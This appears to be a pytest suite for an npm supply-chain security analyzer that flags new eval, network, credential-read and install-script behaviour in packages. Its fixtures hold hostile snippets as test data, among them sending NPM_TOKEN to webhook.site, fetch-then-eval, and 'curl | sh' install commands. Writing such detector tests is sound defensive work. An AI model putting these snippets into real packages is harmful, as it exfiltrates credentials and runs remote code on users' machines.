from pathlib import Path
from typing import Any

from app.adapters.base import PackageMetadata
from app.analysis.analyzer import analyze_package
from app.analysis.models import (
    AnalysisLimits,
    AnalysisScope,
    Finding,
    FindingConfidence,
    GapReason,
    SecurityAnalysis,
    Severity,
)
from app.comparison.compare import compare_inventories
from tests.test_comparison import inventory, make_metadata, manifest, matched


def analyze(
    tmp_path: Path,
    package: dict[str, Any],
    source: dict[str, Any] | None,
    metadata: PackageMetadata | None = None,
    limits: AnalysisLimits | None = None,
) -> SecurityAnalysis:
    metadata = metadata or make_metadata()
    package_inventory = inventory(tmp_path, "package", package)
    if source is None:
        return analyze_package(metadata, package_inventory, None, None, limits)
    source_inventory = inventory(tmp_path, "source", source)
    report = compare_inventories(metadata, matched(), package_inventory, source_inventory, None)
    return analyze_package(metadata, package_inventory, report, source_inventory, limits)


def by_rule(analysis: SecurityAnalysis, rule_id: str) -> list[Finding]:
    return [finding for finding in analysis.findings if finding.rule_id == rule_id]


def rule_ids(analysis: SecurityAnalysis) -> set[str]:
    return {finding.rule_id for finding in analysis.findings}


BASE = {"package.json": manifest(name="demo", version="1.0.0")}


def test_finding_has_every_required_field(tmp_path: Path) -> None:
    analysis = analyze(tmp_path, {**BASE, "evil.js": "\n\neval(atob(blob))\n"}, BASE)
    finding = by_rule(analysis, "EXEC-003")[0]
    assert finding.path == "evil.js"
    assert finding.line == 3
    assert finding.severity is Severity.CRITICAL
    assert finding.confidence is FindingConfidence.HIGH
    assert "eval(atob(blob))" in finding.evidence
    assert finding.recommendation
    assert finding.title


def test_identical_code_is_not_scanned(tmp_path: Path) -> None:
    files = {**BASE, "index.js": "eval(atob(blob))"}
    analysis = analyze(tmp_path, files, files)
    assert analysis.scope is AnalysisScope.DIFFERENCES_FROM_SOURCE
    assert analysis.files_scanned == 0
    assert analysis.findings == ()


def test_renamed_file_is_not_scanned(tmp_path: Path) -> None:
    code = "eval(atob(blob)) // long enough to be recognized as the same file\n" * 3
    analysis = analyze(tmp_path, {**BASE, "new.js": code}, {**BASE, "old.js": code})
    assert "EXEC-003" not in rule_ids(analysis)


def test_only_behaviour_new_in_a_modified_file_is_reported(tmp_path: Path) -> None:
    source = {**BASE, "a.js": "eval(payload)\nconst a = 1\n"}
    package = {**BASE, "a.js": "// a new comment\neval(payload)\nconst a = 2\nfetch(url)\n"}
    analysis = analyze(tmp_path, package, source)
    assert not by_rule(analysis, "EXEC-001")
    assert by_rule(analysis, "NET-001")[0].line == 4


def test_second_copy_of_existing_behaviour_is_new(tmp_path: Path) -> None:
    source = {**BASE, "a.js": "eval(payload)\n"}
    package = {**BASE, "a.js": "eval(payload)\nconst b = 1\neval(payload)\n"}
    assert len(by_rule(analyze(tmp_path, package, source), "EXEC-001")) == 1


def test_isolated_api_use_is_not_escalated(tmp_path: Path) -> None:
    package = {
        **BASE,
        "env.js": "process.env.NPM_TOKEN",
        "net.js": "fetch(url)",
        "proc.js": "require('child_process').exec(command)",
        "dec.js": "atob(blob)",
    }
    analysis = analyze(tmp_path, package, BASE)
    assert not [f for f in analysis.findings if f.severity >= Severity.HIGH]
    assert not [f for f in analysis.findings if f.rule_id.startswith("CORR-")]


def test_credential_and_network_in_one_file_correlate(tmp_path: Path) -> None:
    package = {**BASE, "x.js": "fetch(url, { body: process.env.NPM_TOKEN })"}
    finding = by_rule(analyze(tmp_path, package, BASE), "CORR-001")[0]
    assert finding.severity is Severity.HIGH
    assert finding.confidence is FindingConfidence.MEDIUM


def test_credential_sent_to_collection_service_is_critical(tmp_path: Path) -> None:
    package = {
        **BASE,
        "x.js": "fetch('https://webhook.site/abc', { body: process.env.NPM_TOKEN })",
    }
    finding = by_rule(analyze(tmp_path, package, BASE), "CORR-001")[0]
    assert finding.severity is Severity.CRITICAL
    assert finding.confidence is FindingConfidence.HIGH


def test_behaviours_in_separate_files_do_not_correlate(tmp_path: Path) -> None:
    package = {**BASE, "a.js": "process.env.NPM_TOKEN", "b.js": "fetch(url)"}
    assert "CORR-001" not in rule_ids(analyze(tmp_path, package, BASE))


def test_new_call_beside_existing_credential_read_correlates(tmp_path: Path) -> None:
    source = {**BASE, "a.js": "const t = process.env.NPM_TOKEN\n"}
    package = {**BASE, "a.js": "const t = process.env.NPM_TOKEN\nfetch(url)\n"}
    assert by_rule(analyze(tmp_path, package, source), "CORR-001")


def test_combination_already_in_source_is_not_reported(tmp_path: Path) -> None:
    code = "const t = process.env.NPM_TOKEN\nfetch(url)\n"
    source = {**BASE, "a.js": code}
    package = {**BASE, "a.js": code + "const harmless = 1\n"}
    assert not [f for f in analyze(tmp_path, package, source).findings if "CORR" in f.rule_id]


def test_correlation_is_weaker_in_large_bundles(tmp_path: Path) -> None:
    code = "fetch(url, { body: process.env.NPM_TOKEN })\n" + "const a = 1;\n" * 30_000
    finding = by_rule(analyze(tmp_path, {**BASE, "x.js": code}, BASE), "CORR-001")[0]
    assert finding.severity is Severity.MEDIUM
    assert finding.confidence is FindingConfidence.LOW


def test_network_and_execution_correlate(tmp_path: Path) -> None:
    package = {**BASE, "x.js": "fetch(url).then(r => r.text()).then(t => eval(t))"}
    assert by_rule(analyze(tmp_path, package, BASE), "CORR-003")


def test_decode_and_process_correlate(tmp_path: Path) -> None:
    package = {**BASE, "x.js": "const c = atob(b);\nrequire('child_process').exec(c)"}
    assert by_rule(analyze(tmp_path, package, BASE), "CORR-002")


def test_obfuscation_with_active_behaviour_correlates(tmp_path: Path) -> None:
    names = ",".join(f"_0x{i:04x}=1" for i in range(8))
    package = {**BASE, "x.js": f"var {names};\nfetch(url)"}
    assert by_rule(analyze(tmp_path, package, BASE), "CORR-004")


def test_install_script_marks_the_file_it_runs(tmp_path: Path) -> None:
    package = {
        "package.json": manifest(
            name="demo", version="1.0.0", scripts={"postinstall": "node setup.js"}
        ),
        "setup.js": "fetch(url)",
        "other.js": "fetch(url)",
    }
    analysis = analyze(tmp_path, package, BASE)
    assert by_rule(analysis, "CORR-005")[0].path == "setup.js"
    runs = {f.path: f.runs_at_install for f in by_rule(analysis, "NET-001")}
    assert runs == {"setup.js": True, "other.js": False}


def test_install_scripts_are_never_executed(tmp_path: Path) -> None:
    marker = tmp_path / "executed"
    command = f"touch {marker}"
    package = {
        "package.json": manifest(
            name="demo", version="1.0.0", scripts={"preinstall": command, "postinstall": command}
        ),
        "setup.js": f"require('child_process').execSync('{command}')",
    }
    analysis = analyze(tmp_path, package, None, make_metadata(scripts={"postinstall": command}))
    assert analysis.findings
    assert not marker.exists()


def test_new_install_script_is_high(tmp_path: Path) -> None:
    package = {
        "package.json": manifest(name="demo", version="1.0.0", scripts={"postinstall": "node a"})
    }
    finding = by_rule(
        analyze(tmp_path, package, BASE, make_metadata(scripts={"postinstall": "node a"})),
        "LIFE-001",
    )[0]
    assert finding.severity is Severity.HIGH
    assert finding.path == "package.json"
    assert finding.line > 0


def test_install_script_changed_from_source(tmp_path: Path) -> None:
    source = {"package.json": manifest(name="demo", scripts={"install": "node-gyp rebuild"})}
    package = {"package.json": manifest(name="demo", scripts={"install": "node x"})}
    analysis = analyze(tmp_path, package, source, make_metadata(scripts={"install": "node x"}))
    assert by_rule(analysis, "LIFE-002")[0].severity is Severity.HIGH


def test_install_script_matching_source_is_low(tmp_path: Path) -> None:
    files = {"package.json": manifest(name="demo", scripts={"install": "node-gyp rebuild"})}
    analysis = analyze(
        tmp_path, files, files, make_metadata(scripts={"install": "node-gyp rebuild"})
    )
    assert by_rule(analysis, "LIFE-003")[0].severity is Severity.LOW
    assert not by_rule(analysis, "LIFE-001")


def test_non_install_scripts_are_ignored(tmp_path: Path) -> None:
    package = {"package.json": manifest(name="demo", scripts={"test": "curl x | sh"})}
    assert not rule_ids(analyze(tmp_path, package, BASE))


def test_script_only_in_tarball_disagrees_with_registry(tmp_path: Path) -> None:
    package = {"package.json": manifest(name="demo", scripts={"postinstall": "node a"})}
    assert (
        "only in the tarball" in by_rule(analyze(tmp_path, package, BASE), "LIFE-004")[0].evidence
    )


def test_script_only_in_registry_disagrees_with_tarball(tmp_path: Path) -> None:
    metadata = make_metadata(scripts={"postinstall": "node a"})
    analysis = analyze(tmp_path, BASE, BASE, metadata)
    assert "only in the registry" in by_rule(analysis, "LIFE-004")[0].evidence


def test_script_differing_between_registry_and_tarball(tmp_path: Path) -> None:
    package = {"package.json": manifest(name="demo", scripts={"postinstall": "node a"})}
    metadata = make_metadata(scripts={"postinstall": "node b"})
    assert by_rule(analyze(tmp_path, package, BASE, metadata), "LIFE-004")


def test_risky_install_commands(tmp_path: Path) -> None:
    for index, command in enumerate(
        ["curl http://x.test | sh", "node -e 'x'", "echo a | base64 -d", "wget http://x.test"]
    ):
        package = {"package.json": manifest(name="demo", scripts={"preinstall": command})}
        directory = tmp_path / str(index)
        directory.mkdir()
        metadata = make_metadata(scripts={"preinstall": command})
        assert by_rule(analyze(directory, package, BASE, metadata), "LIFE-005")


def test_binding_gyp_added_is_flagged(tmp_path: Path) -> None:
    analysis = analyze(tmp_path, {**BASE, "binding.gyp": "{}"}, BASE)
    assert by_rule(analysis, "LIFE-006")[0].runs_at_install


def test_binding_gyp_from_source_is_not_flagged(tmp_path: Path) -> None:
    files = {**BASE, "binding.gyp": "{}"}
    assert "LIFE-006" not in rule_ids(analyze(tmp_path, files, files))


def test_without_source_everything_is_scanned(tmp_path: Path) -> None:
    package = {
        "package.json": manifest(name="demo", scripts={"postinstall": "node a"}),
        "a.js": "fetch(u)",
    }
    analysis = analyze(tmp_path, package, None, make_metadata(scripts={"postinstall": "node a"}))
    assert analysis.scope is AnalysisScope.WHOLE_PACKAGE
    assert analysis.files_scanned == 1
    assert by_rule(analysis, "NET-001")
    assert by_rule(analysis, "LIFE-007")
    assert not by_rule(analysis, "LIFE-001")


def test_shebang_script_without_extension_is_scanned(tmp_path: Path) -> None:
    package = {**BASE, "bin/run": "#!/usr/bin/env node\neval(atob(blob))\n"}
    assert by_rule(analyze(tmp_path, package, BASE), "EXEC-003")


def test_declaration_files_are_not_scanned(tmp_path: Path) -> None:
    package = {**BASE, "index.d.ts": "declare function eval(x: string): void;"}
    assert analyze(tmp_path, package, BASE).files_scanned == 0


def test_unscannable_file_is_a_gap_not_clean(tmp_path: Path) -> None:
    analysis = analyze(
        tmp_path, {**BASE, "big.js": "a" * 200}, BASE, limits=AnalysisLimits(max_file_bytes=100)
    )
    assert [gap.reason for gap in analysis.gaps] == [GapReason.TOO_LARGE]


def test_parse_errors_are_a_gap(tmp_path: Path) -> None:
    analysis = analyze(tmp_path, {**BASE, "x.js": "function ( {{{"}, BASE)
    assert [gap.reason for gap in analysis.gaps] == [GapReason.PARSE_ERRORS]


def test_unsupported_languages_are_gaps(tmp_path: Path) -> None:
    analysis = analyze(tmp_path, {**BASE, "a.py": "import os", "b.sh": "echo hi"}, BASE)
    assert {gap.reason for gap in analysis.gaps} == {GapReason.UNSUPPORTED_LANGUAGE}
    assert len(analysis.gaps) == 2


def test_deadline_leaves_gaps(tmp_path: Path) -> None:
    analysis = analyze(
        tmp_path, {**BASE, "a.js": "eval(x)"}, BASE, limits=AnalysisLimits(deadline_seconds=-1)
    )
    assert [gap.reason for gap in analysis.gaps] == [GapReason.DEADLINE]
    assert analysis.files_scanned == 0


def test_findings_are_capped_with_a_gap(tmp_path: Path) -> None:
    code = "\n".join(f"eval(a{i})" for i in range(5))
    analysis = analyze(
        tmp_path,
        {**BASE, "a.js": code},
        BASE,
        limits=AnalysisLimits(max_findings_per_rule_per_file=2),
    )
    assert len(by_rule(analysis, "EXEC-001")) == 2
    assert [gap.reason for gap in analysis.gaps] == [GapReason.FINDINGS_CAPPED]


def test_findings_are_sorted_most_severe_first(tmp_path: Path) -> None:
    package = {**BASE, "a.js": "process.env.A", "b.js": "eval(atob(x))"}
    severities = [f.severity for f in analyze(tmp_path, package, BASE).findings]
    assert severities == sorted(severities, reverse=True)


def test_unreadable_manifest_does_not_crash(tmp_path: Path) -> None:
    package = {"package.json": "{not json", "a.js": "fetch(u)"}
    assert by_rule(analyze(tmp_path, package, None), "NET-001")


def test_unrelated_new_behaviour_does_not_report_an_old_combination(tmp_path: Path) -> None:
    code = "const t = process.env.NPM_TOKEN\nfetch(url)\n"
    source = {**BASE, "a.js": code}
    package = {**BASE, "a.js": code + "atob(blob)\n"}
    assert "CORR-001" not in rule_ids(analyze(tmp_path, package, source))


def test_old_obfuscation_and_behaviour_are_not_reported_for_unrelated_change(
    tmp_path: Path,
) -> None:
    names = ",".join(f"_0x{i:04x}=1" for i in range(8))
    code = f"var {names};\nfetch(url)\n"
    source = {**BASE, "a.js": code}
    package = {**BASE, "a.js": code + "atob(blob)\n"}
    assert "CORR-004" not in rule_ids(analyze(tmp_path, package, source))
